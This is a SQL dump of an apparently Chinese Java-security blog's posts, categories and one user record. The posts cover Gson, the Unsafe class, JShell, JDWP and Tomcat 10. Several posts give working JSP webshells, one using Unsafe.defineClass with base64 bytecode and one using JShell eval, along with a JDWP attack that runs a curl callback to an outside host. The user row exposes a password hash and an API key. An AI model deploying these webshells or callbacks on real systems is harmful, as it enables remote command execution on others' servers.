INSERT INTO `sys_posts` VALUES (7, 1, 14, 'Java Web安全-代码审计系列文章', '园长', '<p>\r\n	这个Java代码审计系列是年前公司内部最后一次技术分享，开源到了Github(<span>包含了代码和文章</span>)也在凌天实验室公众号发布过，因为时间不够并未写完，年后若有时间会将剩下的部分完成。\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	Git地址:&nbsp;<a href=\"https://github.com/anbai-inc/javaweb-codereview\" target=\"_blank\">javaweb-codereview</a>\r\n</p>\r\n<p>\r\n	文章地址:&nbsp;<a href=\"https://github.com/anbai-inc/javaweb-codereview/blob/master/JavaSecureCodeReview.md\" target=\"_blank\">JavaSecureCodeReview</a>\r\n</p>', NULL, '2019-01-31 12:48:08', 1, 00000000000, '', 0, '2019-01-31 12:48:08');
INSERT INTO `sys_posts` VALUES (8, 1, 3, 'Gson sun.misc.Unsafe.allocateInstance序列化Java对象', '园长', '<p>\r\n	最近使用Fastjson的时候遇到一个类无空构造方法导致无法反序列化类对象,试了下Fastjson和Jackson都无法创建，而Gson确可以无视构造方法反序列化对象。\r\n</p>\r\n<p>\r\n	<b>测试类:TestRequest.java</b> \r\n</p>\r\n<pre class=\"brush: java; gutter: true\">public class TestRequest implements Serializable {\r\n\r\n	private String method;\r\n\r\n	private String queryString;\r\n\r\n	private String requestURI;\r\n\r\n	public TestRequest(HttpServletRequest request) {\r\n		this.method = request.getMethod();\r\n		this.queryString = request.getQueryString();\r\n		this.requestURI = request.getRequestURI();\r\n	}\r\n\r\n        .......省略get/set方法\r\n}</pre>\r\n<br />\r\n<p>\r\n	跟了下Gson的序列化方式发现它封装了一个com.google.gson.internal.UnsafeAllocator类，见名知意，原来Gson使用sun.misc.Unsafe的allocateInstance方法来绕过了构造方法限制创建实例。熟悉Java安全的小伙伴儿应该都对<span>sun.misc.Unsafe有所了解，<span>Unsafe可以绕过很多JVM的限制，但如它名字一样这个类是不安全的，<span>Unsafe大多数方法都是调用了JNI的native方法实现的</span>。</span></span>\r\n</p>\r\n<p>\r\n	而Fastjson和Jackson应该都是使用了Java的反射机制来创建类示例的，其中的Fastjson自作聪明的给无空构造方法的类都传递了一个null变量,在一定程度上还是能成功创建类实例，但是比较鸡肋，真是伤脑筋.\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>', NULL, '2019-01-31 23:43:27', 1, 00000000000, '', 0, '2019-01-31 23:43:27');
INSERT INTO `sys_posts` VALUES (9, 1, 3, 'Java11之前使用sun.misc.Unsafe定义类对象', '园长', '<p>\r\n	上一篇文章写了如何使用Unsafe来创建任意类对象的实例，这篇文章接着写如何使用Unsafe来定义一个类对象。\r\n</p>\r\n<p>\r\n	正常情况下我们可以重写ClassLoader类来实现定义任意的类，但是某些时候我们无法通过自定义ClassLoader来定义类的时候可以使用这种方式来定义一个class，但是前提条件是在JDK11之前的版本。\r\n</p>\r\n<p>\r\n	如果我们需要定义一个名为com.anbai.lingxe.agent.AbTest的类可以使用如下方式：\r\n</p>\r\n<p>\r\n	com.anbai.lingxe.agent.AbTest示例代码如下：\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">package com.anbai.lingxe.agent;\r\n\r\nimport java.io.IOException;\r\n\r\npublic class AbTest {\r\n\r\n	public static Process exec(String cmd) throws IOException {\r\n		return Runtime.getRuntime().exec(cmd);\r\n	} \r\n	\r\n}</pre>\r\n<p>\r\n	测试jsp代码：\r\n</p>\r\n<p>\r\n<pre class=\"brush: java; gutter: true\">&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;\r\n&lt;%@ page import=\"sun.misc.BASE64Decoder\" %&gt;\r\n&lt;%@ page import=\"sun.misc.Unsafe\" %&gt;\r\n&lt;%@ page import=\"java.io.InputStream\" %&gt;\r\n&lt;%@ page import=\"java.lang.reflect.Field\" %&gt;\r\n&lt;%--\r\n    JDK11之前使用Unsafe来定义任意的类对象并通过反射调用类方法\r\n    测试方法: curl -i http://localhost:8080/modules/unsafe.jsp?bytes=yv66vgAAADIAHwcAAgEAHWNvbS9hbmJhaS9saW5neGUvYWdlbnQvQWJUZXN0BwAEAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgEABENvZGUKAAMACQwABQAGAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAH0xjb20vYW5iYWkvbGluZ3hlL2FnZW50L0FiVGVzdDsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAKRXhjZXB0aW9ucwcAEgEAE2phdmEvaW8vSU9FeGNlcHRpb24KABQAFgcAFQEAEWphdmEvbGFuZy9SdW50aW1lDAAXABgBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgAUABoMAA4ADwEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAAtBYlRlc3QuamF2YQAhAAEAAwAAAAAAAgABAAUABgABAAcAAAAvAAEAAQAAAAUqtwAIsQAAAAIACgAAAAYAAQAAAAUACwAAAAwAAQAAAAUADAANAAAACQAOAA8AAgAQAAAABAABABEABwAAADIAAgABAAAACLgAEyq2ABmwAAAAAgAKAAAABgABAAAACAALAAAADAABAAAACAAbABwAAAABAB0AAAACAB4%3D&amp;cmd=pwd\r\n--%&gt;\r\n&lt;%\r\n    String className = \"com.anbai.lingxe.agent.AbTest\";// 定义一个不存在的类\r\n    Class clazz = null;\r\n\r\n    try {\r\n        // 反射调用下,如果这个类已经被声明了就没必要再创建了\r\n        clazz = Class.forName(className);\r\n    } catch (ClassNotFoundException e) {\r\n        // base64解码请求参数后获取这个类的字节码\r\n        byte[] bytes = new BASE64Decoder().decodeBuffer(request.getParameter(\"bytes\"));\r\n\r\n        // 通过反射获取到Unsafe实例,因为无法直接通过Unsafe.getUnsafe()来获取实例\r\n        Field f = Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");\r\n        f.setAccessible(true);\r\n\r\n        // 使用Unsafe.defineClass()方法来定义一个类\r\n        clazz = ((Unsafe) f.get(null)).defineClass(className, bytes, 0, bytes.length, getClass().getClassLoader(), null);\r\n    }\r\n\r\n    // 上面的逻辑如果没有错误就已经成功的拿到需要创建的类对象了,所以接下来只需要调用类方法就可以了.\r\n    // 这里调用com.anbai.lingxe.agent.AbTest.exec(cmd)方法,并输出命令执行结果\r\n    Process process = (Process) clazz.getMethod(\"exec\", String.class).invoke(null, request.getParameter(\"cmd\"));\r\n    InputStream in = process.getInputStream();\r\n    java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\A\");\r\n    out.println(s.hasNext() ? s.next() : \"\");\r\n%&gt;</pre>\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	请求jsp测试类创建和调用结果：\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20190910/20190910150958_332.png\" alt=\"\" width=\"600\" height=\"88\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	测试访问：\r\n<pre><span style=\"color:#808080;font-style:italic;\">http://localhost:8080/modules/unsafe.jsp?bytes=yv66vgAAADIAHwcAAgEAHWNvbS9hbmJhaS9saW5neGUvYWdlbnQvQWJUZXN0BwAEAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgEABENvZGUKAAMACQwABQAGAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAH0xjb20vYW5iYWkvbGluZ3hlL2FnZW50L0FiVGVzdDsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAKRXhjZXB0aW9ucwcAEgEAE2phdmEvaW8vSU9FeGNlcHRpb24KABQAFgcAFQEAEWphdmEvbGFuZy9SdW50aW1lDAAXABgBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgAUABoMAA4ADwEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAAtBYlRlc3QuamF2YQAhAAEAAwAAAAAAAgABAAUABgABAAcAAAAvAAEAAQAAAAUqtwAIsQAAAAIACgAAAAYAAQAAAAUACwAAAAwAAQAAAAUADAANAAAACQAOAA8AAgAQAAAABAABABEABwAAADIAAgABAAAACLgAEyq2ABmwAAAAAgAKAAAABgABAAAACAALAAAADAABAAAACAAbABwAAAABAB0AAAACAB4%3D&amp;cmd=pwd</span></pre>\r\n</p>\r\n<p>\r\n	新版本的JDK已经把这个native方法移除了，可以使用使用java.lang.invoke.MethodHandles.Lookup.defineClass来代替，<span>MethodHandles不过是间接的调用了ClassLoader的<span>defineClass罢了，所以就没得玩了，</span></span>这个<span>Unsafe的<span>defineClass</span></span>实现代码：\r\n</p>\r\n<p>\r\n	<a href=\"https://github.com/unofficial-openjdk/openjdk/blob/7be094e012bd92bdf66c04450a36f9b4f7dad1cb/src/hotspot/share/prims/unsafe.cpp#L657\" target=\"_blank\">https://github.com/unofficial-openjdk/openjdk/blob/7be094e012bd92bdf66c04450a36f9b4f7dad1cb/src/hotspot/share/prims/unsafe.cpp#L657</a>\r\n</p>\r\n<p>\r\n	<br />\r\n</p>', NULL, '2019-09-10 15:12:23', 1, 00000000000, '', 0, '2019-09-10 15:12:23');
INSERT INTO `sys_posts` VALUES (10, 1, 3, 'JShell(JDK9+) eval 任意Java代码片段执行', '园长', '<p>\r\n	最近几年开发RASP产品期间整理了很多的Java语言的特性，不过一直都没有时间写文章，可能真的是变懒了吧～\r\n</p>\r\n<p>\r\n	<span>JDK9</span>开始提供了一个叫jshell的功能，让开发者可以想python和php一样在命令行下愉快的写测试代码了。JDK9已经发布距今(2019年9月)了2年时间了，但在生产环境下使用JDK8以上的应用依旧寥寥无几。不过我们只需要利用这一特性其实是可以实现任意代码执行了，也就是说正真意义上的原生的java一句话木马实现了。\r\n</p>\r\n<p>\r\n	测试代码：\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">&lt;%=jdk.jshell.JShell.builder().build().eval(request.getParameter(\"src\"))%&gt;</pre>\r\n<p>\r\n	就这么简单的一行代码就可以了，src参数值是java代码片段。\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20190910/20190910185302_297.png\" alt=\"\" width=\"900\" height=\"104\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	测试用例：<a href=\"http://localhost:8080/modules/jshell.jsp?src=new%20java.io.BufferedReader(new%20java.io.InputStreamReader(Runtime.getRuntime().exec(%22pwd%22).getInputStream())).readLine()\">http://localhost:8080/modules/jshell.jsp?src=new%20java.io.BufferedReader(new%20java.io.InputStreamReader(Runtime.getRuntime().exec(%22pwd%22).getInputStream())).readLine()</a> \r\n</p>\r\n<p>\r\n	如果强迫症想撸掉多余的输出：\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">&lt;%=jdk.jshell.JShell.builder().build().eval(request.getParameter(\"src\")).get(0).value().replaceAll(\"^\\\"\", \"\").replaceAll(\"\\\"$\", \"\")%&gt;</pre>', NULL, '2019-09-10 18:56:13', 1, 00000000000, '', 0, '2019-09-10 18:56:13');
INSERT INTO `sys_posts` VALUES (11, 1, 3, '用Java 调试协议JDWP(Java DEbugger Wire Protocol) 弹shell', '园长', '<p>\r\n	JPDA(Java Platform Debugger Architecture) 是 Java 平台调试体系结构的缩写，通过 JPDA 提供的 API，开发人员可以方便灵活的搭建 Java 调试应用程序。\r\n</p>\r\n<p>\r\n	大概在2015年左右用tangscan扫到了很几次jdwp服务端口，当时只是简单的测试过这个服务。\r\n</p>\r\n<p>\r\n	这个jdwp服务提供来对java程序调试的功能，只要有程序启动时使用了jdwp参数且端口绑定在内网或者共网上时候我们就可以利用这个服务来执行java代码片段弹shell。比较典型的有tomcat启动的时候如果是以jpda方式启动的话就会启动一个8000端口用于远程调试。\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20190918/20190918164155_580.png\" alt=\"\" width=\"700\" height=\"161\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	假设我们需要远程调试一段Java程序，如Test.java的main方法：\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20190918/20190918161911_104.png\" alt=\"\" width=\"400\" height=\"140\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	如果要远程调试我们就需要使用到远程调试参数，我们使用IDEA远程调试的时候会提示我们配置如下参数：\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20190918/20190918161657_473.png\" alt=\"\" width=\"700\" height=\"440\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	所以我们只需要在执行:java Test 之前添加我们的调试参数即可。\r\n</p>\r\n<p>\r\n	首先在内网找一个小白鼠，让他帮我们调试下这个Test.java，在启动的时候加上如下参数：\r\n</p>\r\n<p>\r\n	java&nbsp;-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=*:8003 Test\r\n</p>\r\n<p>\r\n	如下图：\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20190918/20190918162359_476.png\" alt=\"\" width=\"960\" height=\"69\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	小白鼠告诉我他的内外IP是：192.168.88.203，于是我们使用java自带的jdb(Java调试工具)来连接他的8003端口。\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20190918/20190918162732_784.png\" alt=\"\" width=\"700\" height=\"231\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	jdb自带了很多命令，可以通过命令来查看各种调试信息，详情可以自己执行help命令查看。\r\n</p>\r\n<pre class=\"brush: bash; gutter: true\">** 命令列表 **\r\nconnectors                -- 列出此 VM 中可用的连接器和传输\r\n\r\nrun [class [args]]        -- 开始执行应用程序的主类\r\n\r\nthreads [threadgroup]     -- 列出线程\r\nthread-- 设置默认线程\r\nsuspend [thread id(s)]    -- 挂起线程 (默认值: all)\r\nresume [thread id(s)]     -- 恢复线程 (默认值: all)\r\nwhere [| all] -- 转储线程的堆栈\r\nwherei [| all]-- 转储线程的堆栈, 以及 pc 信息\r\nup [n frames]             -- 上移线程的堆栈\r\ndown [n frames]           -- 下移线程的堆栈\r\nkill-- 终止具有给定的异常错误对象的线程\r\ninterrupt-- 中断线程\r\n\r\nprint-- 输出表达式的值\r\ndump-- 输出所有对象信息\r\neval-- 对表达式求值 (与 print 相同)\r\nset=-- 向字段/变量/数组元素分配新值\r\nlocals                    -- 输出当前堆栈帧中的所有本地变量\r\n\r\nclasses                   -- 列出当前已知的类\r\nclass-- 显示已命名类的详细资料\r\nmethods-- 列出类的方法\r\nfields-- 列出类的字段\r\n\r\nthreadgroups              -- 列出线程组\r\nthreadgroup-- 设置当前线程组\r\n\r\nstop in.[(argument_type,...)]\r\n                          -- 在方法中设置断点\r\nstop at:-- 在行中设置断点\r\nclear.[(argument_type,...)]\r\n                          -- 清除方法中的断点\r\nclear:-- 清除行中的断点\r\nclear                     -- 列出断点\r\ncatch [uncaught|caught|all]|-- 出现指定的异常错误时中断\r\nignore [uncaught|caught|all]|-- 对于指定的异常错误, 取消 \'catch\'\r\nwatch [access|all].-- 监视对字段的访问/修改\r\nunwatch [access|all].-- 停止监视对字段的访问/修改\r\ntrace [go] methods [thread]\r\n                          -- 跟踪方法进入和退出。\r\n                          -- 除非指定 \'go\', 否则挂起所有线程\r\ntrace [go] method exit | exits [thread]\r\n                          -- 跟踪当前方法的退出, 或者所有方法的退出\r\n                          -- 除非指定 \'go\', 否则挂起所有线程\r\nuntrace [methods]         -- 停止跟踪方法进入和/或退出\r\nstep                      -- 执行当前行\r\nstep up                   -- 一直执行, 直到当前方法返回到其调用方\r\nstepi                     -- 执行当前指令\r\n下一步                      -- 步进一行 (步过调用)\r\ncont                      -- 从断点处继续执行\r\n\r\nlist [line number|method] -- 输出源代码\r\nuse (或 sourcepath) [source file path]\r\n                          -- 显示或更改源路径\r\nexclude [, ... | \"none\"]\r\n                          -- 对于指定的类, 不报告步骤或方法事件\r\nclasspath                 -- 从目标 VM 输出类路径信息\r\n\r\nmonitor-- 每次程序停止时执行命令\r\nmonitor                   -- 列出监视器\r\nunmonitor <monitor#>      -- 删除监视器\r\nread-- 读取并执行命令文件\r\n\r\nlock-- 输出对象的锁信息\r\nthreadlocks [thread id]   -- 输出线程的锁信息\r\n\r\npop                       -- 通过当前帧出栈, 且包含当前帧\r\nreenter                   -- 与 pop 相同, 但重新进入当前帧\r\nredefine-- 重新定义类的代码\r\n\r\ndisablegc-- 禁止对象的垃圾收集\r\nenablegc-- 允许对象的垃圾收集\r\n\r\n!!                        -- 重复执行最后一个命令-- 将命令重复执行 n 次\r\n#-- 放弃 (无操作)\r\nhelp (或 ?)               -- 列出命令\r\nversion                   -- 输出版本信息\r\nexit (或 quit)            -- 退出调试器: 带有程序包限定符的完整类名: 带有前导或尾随通配符 (\'*\') 的类名: \'threads\' 命令中报告的线程编号: Java(TM) 编程语言表达式。\r\n支持大多数常见语法。\r\n\r\n可以将启动命令置于 \"jdb.ini\" 或 \".jdbrc\" 中\r\n位于 user.home 或 user.dir 中</monitor#></pre>\r\n因为他使用的是暂停模式，所以我们可以直接在jdb中执行stepi命令来执行当前指令，否则我们需要使用stop 命令来设置断点了，然后我们就可以使用eval或者print指令来调用Runtime去执行系统命令：\r\n<p>\r\n	eval java.lang.Runtime.getRuntime().exec(\"curl p2j.cn:8003\").getInputStream())\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20190918/20190918163235_140.png\" alt=\"\" width=\"800\" height=\"108\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	我们需要在远程服务器上nc下8003端口即可接收受攻击的机器curl过来的请求：\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20190918/20190918163600_499.png\" alt=\"\" width=\"400\" height=\"158\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	也就是说我们可以在别人debug的时候使用jdb attach进去然后悄无声息的弹个shell回来玩了，这种场景在内网通常是比较常见的遇到这个服务的时候记得试试吧。\r\n</p>\r\n<p>\r\n	jdb参考资料：\r\n</p>\r\n<p>\r\n	<a href=\"http://docs.oracle.com/javase/7/docs/technotes/tools/windows/jdb.html\">http://docs.oracle.com/javase/7/docs/technotes/tools/windows/jdb.html</a> \r\n</p>\r\n<p>\r\n	<a href=\"https://www.javatpoint.com/jdb-expression\">https://www.javatpoint.com/jdb-expression</a> \r\n</p>\r\n<p>\r\n	<a href=\"https://www.tutorialspoint.com/jdb/jdb_quick_guide.htm\">https://www.tutorialspoint.com/jdb/jdb_quick_guide.htm</a> \r\n</p>', NULL, '2019-09-18 16:45:58', 1, 00000000000, '', 0, '2019-09-18 16:45:58');
INSERT INTO `sys_posts` VALUES (12, 1, 3, 'Tomcat 10自带Jakarta® EE，包名不再是“javax.servlet.**”', '园长', '<p>\r\n	自从Oracle把Java EE捐给Apache后新版本的JavaEE也就正式的改名为了\"Jakarta&reg; EE\"。值得注意的是2020年2月Tomcat发布了第10个版本，Tomcat 10 m1将JavaEE也换成了<strong>Jakarta&reg; EE</strong>(<span style=\"color:#333333;font-family:-apple-system, system-ui, &quot;font-size:16px;background-color:#FFFFFF;\">Jakarta Servlet 5.0、Jakarta Server Pages 3.0、Jakarta Expression Language 4.0、Jakarta WebSocket 2.0、Jakarta Authentication 2.0 和 Jakarta Annotations 2.0&nbsp;</span>)。\r\n</p>\r\n<p>\r\n	<span>Jakarta&reg; EE较以前的JavaEE有一个非常非常重要的更新：包名不再是\"</span><span style=\"color:#008000;font-weight:bold;\">javax.servlet.</span>\"而是改成了\"<span style=\"color:#008000;font-weight:bold;\">jakarta.servlet.</span>\"，所以，如果需要兼容新版本的API就赶紧去改包名吧！\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20200305/20200305190206_530.jpg\" alt=\"\" width=\"800\" height=\"459\" title=\"\" align=\"\" /> \r\n</p>', NULL, '2020-03-05 19:04:35', 1, 00000000051, '', 5, '2020-03-05 19:04:35');
COMMIT;

-- ----------------------------
-- Table structure for sys_posts_category
-- ----------------------------
DROP TABLE IF EXISTS `sys_posts_category`;
CREATE TABLE `sys_posts_category` (
  `category_id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '分类ID',
  `category_name` varchar(30) NOT NULL COMMENT '分类名称',
  `category_alias` varchar(30) DEFAULT NULL COMMENT '分类别名',
  `category_description` varchar(100) DEFAULT NULL COMMENT '分类描述',
  `category_url` varchar(255) DEFAULT NULL COMMENT '分类URL地址',
  `category_order` smallint(3) NOT NULL DEFAULT '0' COMMENT '分类级别',
  `parent_id` int(3) NOT NULL COMMENT '父节点ID',
  PRIMARY KEY (`category_id`)
) ENGINE=InnoDB AUTO_INCREMENT=36 DEFAULT CHARSET=utf8 COMMENT='文章分类';

-- ----------------------------
-- Records of sys_posts_category
-- ----------------------------
BEGIN;
INSERT INTO `sys_posts_category` VALUES (1, '未分类', 'uncategorized', NULL, NULL, 8, -1);
INSERT INTO `sys_posts_category` VALUES (2, '友情链接', '%e9%93%be%e6%8e%a5%e8%a1%a8', NULL, '/?p=122', 11, 0);
INSERT INTO `sys_posts_category` VALUES (3, 'Java', 'java', NULL, NULL, 1, 0);
INSERT INTO `sys_posts_category` VALUES (5, 'PHP', 'php', NULL, NULL, 2, 0);
INSERT INTO `sys_posts_category` VALUES (6, 'Database', 'database', NULL, NULL, 4, 0);
INSERT INTO `sys_posts_category` VALUES (7, 'Server', 'server', NULL, NULL, 5, 0);
INSERT INTO `sys_posts_category` VALUES (8, 'Security', 'security', NULL, NULL, 3, 0);
INSERT INTO `sys_posts_category` VALUES (9, 'Linux', 'linux', NULL, NULL, 6, 0);
INSERT INTO `sys_posts_category` VALUES (10, 'Other', 'other', NULL, NULL, 7, 0);
INSERT INTO `sys_posts_category` VALUES (11, 'Spring', 'spring', NULL, NULL, 1, 3);
INSERT INTO `sys_posts_category` VALUES (12, 'Tools', 'tools', NULL, NULL, 3, 8);
INSERT INTO `sys_posts_category` VALUES (13, 'Web Applications', 'web-applications', NULL, NULL, 1, 8);
INSERT INTO `sys_posts_category` VALUES (14, 'Documents', 'documents', NULL, NULL, 2, 8);
INSERT INTO `sys_posts_category` VALUES (15, 'Tomcat', 'tomcat', NULL, NULL, 1, 7);
INSERT INTO `sys_posts_category` VALUES (16, 'Oracle', 'oracle', NULL, NULL, 1, 6);
INSERT INTO `sys_posts_category` VALUES (17, 'MySQL', 'mysql', NULL, NULL, 2, 6);
INSERT INTO `sys_posts_category` VALUES (18, 'Nginx', 'nginx', NULL, NULL, 2, 7);
INSERT INTO `sys_posts_category` VALUES (19, 'Resin', 'resin', NULL, NULL, 3, 7);
INSERT INTO `sys_posts_category` VALUES (20, 'Jboss', 'jboss', NULL, NULL, 4, 7);
INSERT INTO `sys_posts_category` VALUES (21, 'Weblogic', 'weblogic', NULL, NULL, 5, 7);
INSERT INTO `sys_posts_category` VALUES (23, 'MongoDB', 'mongodb', NULL, NULL, 3, 6);
INSERT INTO `sys_posts_category` VALUES (24, 'Hadoop', 'hadoop', NULL, NULL, 4, 3);
INSERT INTO `sys_posts_category` VALUES (27, 'Swing', 'swing', NULL, NULL, 2, 3);
INSERT INTO `sys_posts_category` VALUES (28, 'C/C++', 'cc', NULL, NULL, 1, 10);
INSERT INTO `sys_posts_category` VALUES (31, 'Struts2', 'struts2', NULL, NULL, 3, 3);
INSERT INTO `sys_posts_category` VALUES (32, 'Elasticsearch', NULL, 'Elasticsearch', NULL, 5, 3);
INSERT INTO `sys_posts_category` VALUES (33, 'JPA', 'jpa', 'JPA', NULL, 1, 11);
INSERT INTO `sys_posts_category` VALUES (34, 'About', 'about', '关于', '/?p=1148', 10, 0);
INSERT INTO `sys_posts_category` VALUES (35, 'JavaSec', 'javasec', 'JavaSec', 'http://javasec.org/', 9, 0);
COMMIT;

-- ----------------------------
-- Table structure for sys_user
-- ----------------------------
DROP TABLE IF EXISTS `sys_user`;
CREATE TABLE `sys_user` (
  `user_id` int(9) unsigned NOT NULL AUTO_INCREMENT COMMENT '用户ID',
  `username` varchar(16) NOT NULL COMMENT '用户名',
  `password` varchar(32) NOT NULL COMMENT '用户密码',
  `nick` varchar(16) DEFAULT NULL COMMENT '用户昵称',
  `real_name` varchar(4) DEFAULT NULL COMMENT '真实姓名',
  `weixin_id` varchar(32) DEFAULT NULL COMMENT '微信号',
  `user_type` tinyint(4) NOT NULL COMMENT '用户类型',
  `status` smallint(1) DEFAULT '1',
  `user_avatar` varchar(255) DEFAULT NULL,
  `email` varchar(60) DEFAULT NULL COMMENT '邮箱',
  `email_valid` tinyint(1) DEFAULT '0',
  `qq` bigint(11) unsigned DEFAULT '0' COMMENT 'QQ',
  `sign` varchar(255) DEFAULT NULL COMMENT '个人签名',
  `login_times` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '登录次数',
  `register_time` datetime DEFAULT NULL COMMENT '注册时间',
  `login_status` smallint(1) DEFAULT NULL COMMENT '登录状态',
  `last_login_time` datetime DEFAULT NULL COMMENT '最后登录时间',
  `last_login_ip` varchar(15) DEFAULT NULL COMMENT '最后登陆IP地址',
  `api_key` varchar(32) NOT NULL COMMENT 'API KEY',
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `idx_sys_user_username` (`username`) USING BTREE,
  UNIQUE KEY `idx_sys_user_weixin_id` (`weixin_id`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='系统用户表';

-- ----------------------------
-- Records of sys_user
-- ----------------------------
BEGIN;
INSERT INTO `sys_user` VALUES (1, 'yzmm', 'd6cabde1d7a55ac1', '园长', '张三', NULL, 1, 1, './images/user/avatar/01.gif', 'admin@javaweb.org', 1, 123456, '喵~专业打酱油的程序员,业余时间提供送快递服务~', 806, '2013-11-25 12:03:04', 1, '2020-05-03 15:45:16', '127.0.0.1', '133883744fbb32b916ee256c95319265');
COMMIT;

SET FOREIGN_KEY_CHECKS = 1;
